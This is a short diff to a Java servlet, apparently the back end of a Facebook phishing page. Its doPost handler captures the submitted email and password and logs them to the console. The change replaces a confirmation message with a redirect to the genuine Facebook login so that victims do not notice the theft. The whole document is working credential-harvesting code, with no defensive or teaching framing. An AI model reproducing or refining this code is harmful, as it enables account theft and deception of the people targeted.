@@ -13,9 +13,8 @@ public class FBLoginServ extends HttpServlet {
 	protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
 		String user = req.getParameter("email");
 		String passwd = req.getParameter("pass");
-		
-		resp.getWriter().println("<h1>Data Submitted</h1>");
 		System.out.println(user);
 		System.out.println(passwd);
+		resp.sendRedirect("https://www.facebook.com/login");
 	}
 }
